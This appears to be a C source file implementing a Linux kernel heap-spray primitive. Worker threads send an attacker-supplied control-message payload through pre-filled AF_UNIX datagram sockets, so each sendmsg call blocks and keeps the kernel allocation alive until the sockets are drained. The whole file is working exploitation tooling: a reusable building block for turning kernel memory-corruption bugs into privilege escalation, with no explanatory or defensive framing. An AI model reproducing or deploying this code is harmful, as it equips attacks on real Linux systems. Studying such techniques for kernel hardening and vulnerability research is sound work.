#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

typedef struct {
    int gate_pipe[2];
    int sockets[2];
    pthread_t thread;
    void *control_payload;
    size_t control_len;
    void *data_payload;
    size_t data_len;
} sendmsg_control_heap_spray_worker_t;

typedef struct {
    sendmsg_control_heap_spray_worker_t *workers;
    size_t worker_count;
    uint8_t *gate_bytes;
} sendmsg_control_heap_spray_ctx_t;

static void *sendmsg_control_heap_spray_worker_main(void *opaque) {
    sendmsg_control_heap_spray_worker_t *worker = opaque;
    uint8_t gate_byte;
    struct iovec iov = {
        .iov_base = worker->data_payload,
        .iov_len = worker->data_len,
    };
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = worker->control_payload,
        .msg_controllen = worker->control_len,
    };

    if (read(worker->gate_pipe[0], &gate_byte, 1) != 1) {
        return NULL;
    }

    (void)sendmsg(worker->sockets[1], &msg, 0);
    return NULL;
}

int init_sendmsg_control_heap_spray(sendmsg_control_heap_spray_ctx_t *ctx,
                                    size_t worker_count, size_t control_len,
                                    const void *control_payload,
                                    size_t data_len) {
    size_t i;

    if (!ctx || !worker_count || !control_len || !control_payload || !data_len) {
        return -EINVAL;
    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->workers = calloc(worker_count, sizeof(*ctx->workers));
    ctx->gate_bytes = calloc(worker_count, 1);
    if (!ctx->workers || !ctx->gate_bytes) {
        return -ENOMEM;
    }
    ctx->worker_count = worker_count;

    for (i = 0; i < worker_count; i++) {
        sendmsg_control_heap_spray_worker_t *worker = &ctx->workers[i];
        int buf_size = 0x800;

        memset(worker->gate_pipe, -1, sizeof(worker->gate_pipe));
        memset(worker->sockets, -1, sizeof(worker->sockets));

        worker->control_payload = malloc(control_len);
        worker->data_payload = calloc(1, data_len);
        if (!worker->control_payload || !worker->data_payload) {
            return -ENOMEM;
        }

        memcpy(worker->control_payload, control_payload, control_len);
        worker->control_len = control_len;
        worker->data_len = data_len;

        if (pipe(worker->gate_pipe) < 0) {
            return -errno;
        }
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, worker->sockets) < 0) {
            return -errno;
        }
        if (setsockopt(worker->sockets[1], SOL_SOCKET, SO_SNDBUF, &buf_size,
                       sizeof(buf_size)) < 0 ||
            setsockopt(worker->sockets[0], SOL_SOCKET, SO_RCVBUF, &buf_size,
                       sizeof(buf_size)) < 0) {
            return -errno;
        }

        /* Pre-fill the sender so the next sendmsg blocks after copying control data. */
        if (write(worker->sockets[1], worker->data_payload, worker->data_len) !=
            (ssize_t)worker->data_len) {
            return -EIO;
        }
    }

    return 0;
}

int execute_sendmsg_control_heap_spray_arm(sendmsg_control_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        if (pthread_create(&ctx->workers[i].thread, NULL,
                           sendmsg_control_heap_spray_worker_main,
                           &ctx->workers[i]) != 0) {
            return -errno;
        }
    }

    return 0;
}

int execute_sendmsg_control_heap_spray_start(sendmsg_control_heap_spray_ctx_t *ctx) {
    size_t i;
    uint8_t gate_byte = 'S';

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        if (write(ctx->workers[i].gate_pipe[1], &gate_byte, 1) != 1) {
            return -EIO;
        }
    }

    return 0;
}

int execute_sendmsg_control_heap_spray_release(sendmsg_control_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        sendmsg_control_heap_spray_worker_t *worker = &ctx->workers[i];
        uint8_t *drain = malloc(worker->data_len);
        if (!drain) {
            return -ENOMEM;
        }
        if (read(worker->sockets[0], drain, worker->data_len) < 0) {
            free(drain);
            return -EIO;
        }
        free(drain);
    }

    for (i = 0; i < ctx->worker_count; i++) {
        pthread_join(ctx->workers[i].thread, NULL);
    }

    return 0;
}

void cleanup_sendmsg_control_heap_spray(sendmsg_control_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return;
    }

    if (ctx->workers) {
        for (i = 0; i < ctx->worker_count; i++) {
            sendmsg_control_heap_spray_worker_t *worker = &ctx->workers[i];
            if (worker->gate_pipe[0] >= 0) {
                close(worker->gate_pipe[0]);
            }
            if (worker->gate_pipe[1] >= 0) {
                close(worker->gate_pipe[1]);
            }
            if (worker->sockets[0] >= 0) {
                close(worker->sockets[0]);
            }
            if (worker->sockets[1] >= 0) {
                close(worker->sockets[1]);
            }
            free(worker->control_payload);
            free(worker->data_payload);
        }
    }

    free(ctx->workers);
    free(ctx->gate_bytes);
    memset(ctx, 0, sizeof(*ctx));
}
